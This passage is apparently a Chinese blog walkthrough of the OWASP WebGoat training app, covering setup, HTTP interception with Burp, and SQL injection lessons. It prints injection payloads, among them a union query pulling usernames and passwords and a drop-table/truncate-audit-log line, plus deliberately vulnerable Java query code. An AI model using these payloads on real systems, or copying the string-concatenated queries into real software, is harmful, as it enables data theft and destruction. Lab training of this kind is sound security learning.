<!DOCTYPE HTML>
<html lang="zh-CN">
<head>
    <!--Setting-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <meta http-equiv="Cache-Control" content="no-transform">
    <meta name="renderer" content="webkit|ie-comp|ie-stand">
    <meta name="apple-mobile-web-app-capable" content="来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no,email=no,adress=no">
    <meta name="browsermode" content="application">
    <meta name="screen-orientation" content="portrait">
    <meta name="theme-version" content="1.2.3">
    <meta name="root" content="/">
    <link rel="dns-prefetch" href="https://www.ljjyy.com">
    <!--SEO-->

    <meta name="keywords" content="练习,webgoat" />


    <meta name="description" content="概述WebGoat是OWASP组织研制出的用于进行web漏洞实验的Java靶场程序，用来说明web应用中存在的安全漏洞。WebGoat运行在带有java虚拟机的平台之上，当前提供的训练课程有30..." />



<meta name="robots" content="all" />
<meta name="google" content="all" />
<meta name="googlebot" content="all" />
<meta name="verify" content="all" />

    <!--Title-->


<title>Web安全攻防靶场之WebGoat(一) | 来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟</title>


    <link rel="alternate" href="/atom.xml" title="来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟" type="application/atom+xml">


    <link rel="icon" href="/favicon.ico">

    




<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.5.0.css">
<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">





    
	<div class="hide">
        <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
        <script>LA.init({id: "JgbNOaw1xxsmUUsQ",ck: "JgbNOaw1xxsmUUsQ"})</script>
	</div>






    
    <meta name="baidu-site-verification" content="dTHILoORpx" />


    <script>
        (function(){
            var bp = document.createElement('script');
            var curProtocol = window.location.protocol.split(':')[0];
            if (curProtocol === 'https') {
                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
            }
            else {
                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
            }
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(bp, s);
        })();
    </script>

<meta name="generator" content="Hexo 7.3.0"></head>


<!--[if lte IE 8]>
<style>
    html{ font-size: 1em }
</style>
<![endif]-->
<!--[if lte IE 9]>
<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
<![endif]-->

<body>
    <header class="main-header"  >
    <div class="main-header-box">
        <!--a class="header-avatar" href="/" title='Ljjyy.com'>
            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
        </a-->
        <div class="branding">
            
                <h2> 多读书多实践，勤思考善领悟 </h2>
            
    	  </div>
    </div>
</header>
    <nav class="main-navigation">
    <div class="container">

        <div class="row">
            <div class="col-sm-12">
                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
                    <span class="sr-only"></span>
                        <i class="fa fa-bars"></i>
                    </span>
                    <a class="web-logo"  href="/" title='Ljjyy.com'></a>
                    <!--a class="navbar-brand" href="https://www.ljjyy.com">来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟</a-->
                </div>
                <div class="collapse navbar-collapse" id="main-menu" style="">
                    <ul class="menu">
                        
                            <li role="presentation" class="text-center">
                                <a href="/"><i class="fa "></i>首页</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/cloud/"><i class="fa "></i>云计算</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/front/"><i class="fa "></i>前端</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/back/"><i class="fa "></i>后端</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/devops/"><i class="fa "></i>运维</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/crack/"><i class="fa "></i>破解</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/penetration/"><i class="fa "></i>渗透</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/tool/"><i class="fa "></i>工具</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/other/"><i class="fa "></i>其他</a>
                            </li>
                        
                    </ul>
                </div>
            </div>
        </div>
    </div>
</nav>
    <section class="content-wrap">
        <div class="container">
            <div class="row">
                <main class="col-md-8 main-content m-post">
                    <p id="process"></p>
<article class="post">
    <div class="post-head">
        <h1 id="Web安全攻防靶场之WebGoat(一)">
            
	            Web安全攻防靶场之WebGoat(一)
            
        </h1>
        <div class="post-meta">
    
        <span class="categories-meta fa-wrap">
            <i class="fa fa-folder-open-o"></i>
            <a class="category-link" href="/categories/penetration/">渗透</a>
        </span>
    

    
        <span class="fa-wrap">
            <i class="fa fa-tags"></i>
            <span class="tags-meta">
                
                    <a class="tag-none-link" href="/tags/webgoat/" rel="tag">webgoat</a> <a class="tag-none-link" href="/tags/practise/" rel="tag">练习</a>
                
            </span>
        </span>
    

    
        
        <span class="fa-wrap">
            <i class="fa fa-clock-o"></i>
            <span class="date-meta">2018/09/28</span>
        </span>
        
    
</div>
            
            
            <p class="fa fa-exclamation-triangle warning">
                本文于<strong>2362</strong>天之前发表，文中内容可能已经过时。
            </p>
        
    </div>
    
    <div class="post-body post-content">
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>WebGoat是OWASP组织研制出的用于进行web漏洞实验的Java靶场程序，用来说明web应用中存在的安全漏洞。WebGoat运行在带有java虚拟机的平台之上，当前提供的训练课程有30多个，其中包括：跨站点脚本攻击（XSS）、访问控制、线程安全、操作隐藏字段、操纵参数、弱会话cookie、SQL盲注、数字型SQL注入、字符串型SQL注入、web服务、Open Authentication失效、危险的HTML注释等等。WebGoat提供了一系列web安全学习的教程，某些课程也给出了视频演示，指导用户利用这些漏洞进行攻击。</p>
<p>GitHub地址为<a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p>
<p><img src="/img/posts/wg_logo_snag.png" alt="img"></p>
<p>部署后首页截图<br><img src="/img/posts/5f4ae21a1269e0bdf0dca2537deb5f84.png" alt="img"><br><img src="/img/posts/cfd3d8d481875549805718750207aaf7.png" alt="img"></p>
<p>目前WebGoat分为三类，Lesson、Challenges&#x2F;CTF、WebWolf。<br>其中Lesson为课程，每个课程中包括漏洞描述，成因，以及练习，<br><img src="/img/posts/07369df7137f3431b533218763726663.png" alt="img"><br>上图中红色的点就是练习内容，如果练习通过了，红点就变成绿色的。<br>Challenges&#x2F;CTF 就是常规的一些解题内容。<br>WebWolf是一套含有漏洞的应用，用来进行漏洞练习。</p>
<h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="使用release版本部署"><a href="#使用release版本部署" class="headerlink" title="使用release版本部署"></a>使用release版本部署</h2><p>在github上WebGoat的release版本库里<a href="https://github.com/WebGoat/WebGoat/releases">https://github.com/WebGoat/WebGoat/releases</a> 下载release版本。<br><a href="https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M17/webgoat-server-8.0.0.M17.jar">https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M17/webgoat-server-8.0.0.M17.jar</a><br><a href="https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M17/webwolf-8.0.0.M17.jar">https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M17/webwolf-8.0.0.M17.jar</a></p>
<p>下载完成后到下载目录，执行命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar webgoat-server-8.0.0.M17.jar</span><br></pre></td></tr></table></figure>

<p><img src="/img/posts/ad9cf9a7caeb39fc3b927c5b99519a1b.png" alt="img"><br>这样就能打开WebGoat了。<br>同时，官方提供了另外一个含有漏洞的应用WebWolf来，执行命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar webwolf-8.0.0.M17.jar </span><br></pre></td></tr></table></figure>

<p><img src="/img/posts/c7f00793b25ebc0bf76863b5d9797c02.png" alt="img"></p>
<p>都执行成功后，就可以通过通过链接<a href="http://127.0.0.1:8080/WebGoat/">http://127.0.0.1:8080/WebGoat/</a> 访问WebGoat，通过链接<a href="http://127.0.0.1:9090/login">http://127.0.0.1:9090/login</a> 访问WebWolf。</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>首先需要注入一个账号，然后登陆后，按照WebGoat的侧边顺序一项一项进行测试。</p>
<p><img src="/img/posts/58ee6b4a13bd928261b3319d24e2c884.png" alt="img"></p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><h3 id="WebGoat"><a href="#WebGoat" class="headerlink" title="WebGoat"></a>WebGoat</h3><blockquote>
<p>WebGoat is a deliberately insecure application that allows interested developers just like you to test vulnerabilities commonly found in Java-based applications that use common and popular open source components.<br>Now, while we in no way condone causing intentional harm to any animal, goat or otherwise, we think learning everything you can about security vulnerabilities is essential to understanding just what happens when even a small bit of unintended code gets into your applications.<br>What better way to do that than with your very own scapegoat?<br>Feel free to do what you will with him. Hack, poke, prod and if it makes you feel better, scare him until your heart’s content. Go ahead, and hack the goat. We promise he likes it.<br>Thanks for your interest!</p>
</blockquote>
<h3 id="WebWolf"><a href="#WebWolf" class="headerlink" title="WebWolf"></a>WebWolf</h3><p>利用在WebGoat上注册的账号登录<a href="http://127.0.0.1:9090/WebWolf/home">http://127.0.0.1:9090/WebWolf/home</a> 。</p>
<p>里面的两个assignment只要是为了说明钓鱼攻击。简单测试即可</p>
<h2 id="General"><a href="#General" class="headerlink" title="General"></a>General</h2><h3 id="HTTP-Basics"><a href="#HTTP-Basics" class="headerlink" title="HTTP Basics"></a>HTTP Basics</h3><p>本课介绍了理解浏览器和Web应用程序之间数据传输以及如何使用HTTP代理捕获请求&#x2F;响应的基础知识。</p>
<h4 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage 2"></a>Stage 2</h4><p>就是一个简单的发送包程序</p>
<h4 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h4><p>此assignment的主要目的是让学习者学习如何看HTTP数据包，从下图可以看到，该题目使用的数据提方式为POST，里面有参数magic_num，具体指请查看数据包内容。<br>Chrome具体操作为，在页面空白处点击右键，选择<code>检查</code>，然后在新打开的栏目中点击<code>网络</code>，然后在页面上点击<code>Go!</code>，然后选择<code>attack2</code>，查看具体包内容。</p>
<h3 id="HTTP-Proxies"><a href="#HTTP-Proxies" class="headerlink" title="HTTP Proxies"></a>HTTP Proxies</h3><p>这里说明如何使用代理捕获流量，我们使用BurpSuite。</p>
<p>打开BurpSuite，进入下图红框界面，设置代理端户口为127.0.0.1:9999</p>
<p>打开chrome浏览器，安装插件<code>SwitchyOmega</code>，打开设置，新建情景模式<code>burp</code>，代理端口9999。</p>
<p>选择代理burp。</p>
<p>设置Burpsuite代理为打开。</p>
<p>然后进行本单元测试。</p>
<p>点击Submit后，向抓取的包添加<code>x-request-intercepted:true</code>，修改POST提交方式为GET，同时修改参数<code>chagnMe</code>的值为<code>Requests+are+tampered+easily</code>,完成测试。</p>
<h2 id="Injection-Flaws"><a href="#Injection-Flaws" class="headerlink" title="Injection Flaws"></a>Injection Flaws</h2><p>这里是注入攻击的课程，包括sql注入和XXE(XML External Entity attack，外部实体引用攻击)。</p>
<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>了解什么是sql注入攻击，sql注入攻击包括字符型和数字型。</p>
<p>字符型注入</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> name = <span class="string">&#x27;&quot; + userName + &quot;&#x27;</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>

<p>数字型注入</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> employee_id = <span class="string">&quot;  + userID;</span></span><br></pre></td></tr></table></figure>

<p>攻击方式</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">userName</span> = Smith&#x27; or &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">1</span></span><br><span class="line"><span class="attribute">userName</span> =&#x27; or <span class="number">1</span>=<span class="number">1</span> --</span><br><span class="line"><span class="attribute">userID</span> = <span class="number">1234567</span> or <span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="attribute">UserName</span> = Smith閳ワ拷;drop table users; truncate audit_log;--</span><br></pre></td></tr></table></figure>

<p>拼接到sql语句后的形式</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="type">name</span> = <span class="string">&#x27;Smith&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="type">name</span> = <span class="string">&#x27;Smith&#x27;</span> <span class="keyword">or</span> <span class="keyword">TRUE</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> employee_id = <span class="number">1234567</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="Stage7"><a href="#Stage7" class="headerlink" title="Stage7"></a>Stage7</h4><p>输入<code>&#39; or &#39;1&#39;=&#39;1</code>，然后就获取了所有信息。</p>
<h4 id="Stage8"><a href="#Stage8" class="headerlink" title="Stage8"></a>Stage8</h4><p>输入<code>1 or 1=1</code>，然后就获取了所有信息。</p>
<h3 id="SQL-Injection-advanced"><a href="#SQL-Injection-advanced" class="headerlink" title="SQL Injection(advanced)"></a>SQL Injection(advanced)</h3><p>sql特殊符号</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* */</span>    are <span class="keyword">inline</span> comments</span><br><span class="line"><span class="comment">-- , #   are line comments</span></span><br><span class="line">Example: <span class="keyword">Select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="type">name</span> = <span class="string">&#x27;admin&#x27;</span> <span class="comment">--and pass = &#x27;pass&#x27;</span></span><br><span class="line"></span><br><span class="line">;        allows query chaining</span><br><span class="line">Example: <span class="keyword">Select</span> * <span class="keyword">from</span> users; <span class="keyword">drop</span> <span class="keyword">table</span> users;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;,+,||   allows string concatenation</span></span><br><span class="line"><span class="string">Char()   strings without quotes</span></span><br><span class="line"><span class="string">Example: Select * from users where name = &#x27;</span>+<span class="type">char</span>(<span class="number">27</span>) <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>sql语句</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span>   <span class="keyword">Select</span> id, <span class="type">text</span> <span class="keyword">from</span> news <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="type">name</span>, pass <span class="keyword">from</span> users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">join   可以联结其他表</span></span><br></pre></td></tr></table></figure>

<h4 id="Stage3"><a href="#Stage3" class="headerlink" title="Stage3"></a>Stage3</h4><p>union注入，该问题需要注意首先要union的列数一致，同时还需要对应列的类型一致。</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27; union <span class="keyword">select</span> <span class="number">1</span>,user_name,<span class="keyword">password</span>, <span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="number">7</span> <span class="keyword">from</span> user_system_data --</span><br></pre></td></tr></table></figure>



<h4 id="Stage5"><a href="#Stage5" class="headerlink" title="Stage5"></a>Stage5</h4><p>登录代码都写成这样了，目前还没想出来怎么使用tom进行登录。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(method = POST)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> AttackResult <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam</span> String username_login, <span class="meta">@RequestParam</span> String password_login)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DatabaseUtilities.getConnection(webSession);</span><br><span class="line">    checkDatabase(connection);</span><br><span class="line"></span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;select password from &quot;</span> + USERS_TABLE_NAME + <span class="string">&quot; where userid = ? and password = ?&quot;</span>);</span><br><span class="line">    statement.setString(<span class="number">1</span>, username_login);</span><br><span class="line">    statement.setString(<span class="number">2</span>, password_login);</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (resultSet.next() &amp;&amp; <span class="string">&quot;tom&quot;</span>.equals(username_login)) &#123;</span><br><span class="line">        <span class="keyword">return</span> success().build();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> failed().feedback(<span class="string">&quot;NoResultsMatched&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在注册代码处存在问题，在查询用户是否注册时传入的<code>uesrid</code>没有进行任何过滤，会导致盲注漏洞。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PutMapping</span>  <span class="comment">//assignment path is bounded to class so we use different http method :-)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> AttackResult <span class="title function_">registerNewUser</span><span class="params">(<span class="meta">@RequestParam</span> String username_reg, <span class="meta">@RequestParam</span> String email_reg, <span class="meta">@RequestParam</span> String password_reg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">AttackResult</span> <span class="variable">attackResult</span> <span class="operator">=</span> checkArguments(username_reg, email_reg, password_reg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (attackResult == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DatabaseUtilities.getConnection(webSession);</span><br><span class="line">        checkDatabase(connection);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">checkUserQuery</span> <span class="operator">=</span> <span class="string">&quot;select userid from &quot;</span> + USERS_TABLE_NAME + <span class="string">&quot; where userid = &#x27;&quot;</span> + username_reg + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(checkUserQuery);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (resultSet.next()) &#123;</span><br><span class="line">            attackResult = failed().feedback(<span class="string">&quot;user.exists&quot;</span>).feedbackArgs(username_reg).build();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;INSERT INTO &quot;</span> + USERS_TABLE_NAME + <span class="string">&quot; VALUES (?, ?, ?)&quot;</span>);</span><br><span class="line">            preparedStatement.setString(<span class="number">1</span>, username_reg);</span><br><span class="line">            preparedStatement.setString(<span class="number">2</span>, email_reg);</span><br><span class="line">            preparedStatement.setString(<span class="number">3</span>, password_reg);</span><br><span class="line">            preparedStatement.execute();</span><br><span class="line">            attackResult = success().feedback(<span class="string">&quot;user.created&quot;</span>).feedbackArgs(username_reg).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> attackResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以这样进行测试，我已经注册了一个admin账户，再次注册会报用户已注册。</p>
<p>然后使用一个这样<code>admin&#39; and &#39;1&#39;=&#39;2</code>去注册，会发现永远都可以注册成功，具体的原因是这样，<code>admin&#39; and &#39;1&#39;=&#39;2</code>的用户名构造成的查询用户是否注册语句会成为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> userid <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> userid <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，这样的sql语句是永远也查不出结果的，所以就一直提示未注册，这也就证明了这里存在sql盲注漏洞。</p>
<p>可以用sqlmap跑一下看看结果。</p>
<h3 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection(mitigation)"></a>SQL Injection(mitigation)</h3><p>防御sql注入，其实就是session，参数绑定，存储过程这样的注入。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用session防御，session内容正常情况下是用户无法修改的</span></span><br><span class="line">select * from users <span class="type">where</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&quot;</span> + session.getAttribute(<span class="string">&quot;UserID&quot;</span>) + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  参数绑定方式，利用了sql的预编译技术</span></span><br><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE last_name = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(query);</span><br><span class="line">statement.setString(<span class="number">1</span>, accountName);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> statement.executeQuery();</span><br></pre></td></tr></table></figure>

<p>上面说的方式也不是能够绝对的进行sql注入防御，只是减轻。</p>
<p>如参数绑定方式可以使用下面方式绕过。<br>通过使用<code>case when</code>语句可以将<code>order by</code>后的orderExpression表达式中添加select语句。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> lastname;</span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> ...</span><br><span class="line"><span class="keyword">FROM</span> tableList</span><br><span class="line">[<span class="keyword">WHERE</span> Expression]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> orderExpression [, ...]]</span><br><span class="line"></span><br><span class="line">orderExpression:</span><br><span class="line">&#123; columnNr <span class="operator">|</span> columnAlias <span class="operator">|</span> selectExpression &#125;</span><br><span class="line">    [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>]</span><br><span class="line"></span><br><span class="line">selectExpression:</span><br><span class="line">&#123; Expression <span class="operator">|</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">|</span> &#123;</span><br><span class="line">    COUNT <span class="operator">|</span> MIN <span class="operator">|</span> MAX <span class="operator">|</span> SUM <span class="operator">|</span> AVG <span class="operator">|</span> <span class="keyword">SOME</span> <span class="operator">|</span> <span class="keyword">EVERY</span> <span class="operator">|</span></span><br><span class="line">    VAR_POP <span class="operator">|</span> VAR_SAMP <span class="operator">|</span> STDDEV_POP <span class="operator">|</span> STDDEV_SAMP</span><br><span class="line">&#125; ([<span class="keyword">ALL</span> <span class="operator">|</span> <span class="keyword">DISTINCT</span>][<span class="number">2</span>]] Expression) &#125; [[<span class="keyword">AS</span>] label]</span><br><span class="line"></span><br><span class="line">Based <span class="keyword">on</span> HSQLDB</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> (<span class="keyword">case</span> <span class="keyword">when</span> (<span class="literal">true</span>) <span class="keyword">then</span> lastname <span class="keyword">else</span> firstname)</span><br></pre></td></tr></table></figure>

<h4 id="Stage8-question"><a href="#Stage8-question" class="headerlink" title="Stage8 question"></a>Stage8 question</h4><p>这道题目看题目源码就是一个case注入。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(produces = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@SneakyThrows</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Server&gt; <span class="title function_">sort</span><span class="params">(<span class="meta">@RequestParam</span> String column)</span> &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DatabaseUtilities.getConnection(webSession);</span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#x27;out of order&#x27; order by &quot;</span> + column);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> preparedStatement.executeQuery();</span><br><span class="line">        List&lt;Server&gt; servers = Lists.newArrayList();</span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            <span class="type">Server</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Server</span>(rs.getString(<span class="number">1</span>), rs.getString(<span class="number">2</span>), rs.getString(<span class="number">3</span>), rs.getString(<span class="number">4</span>), rs.getString(<span class="number">5</span>), rs.getString(<span class="number">6</span>));</span><br><span class="line">            servers.add(server);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> servers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>目前使用<code>(case when (true) then id else ip end)</code>写在column中是可以执行的，对应的sql语句为</p>
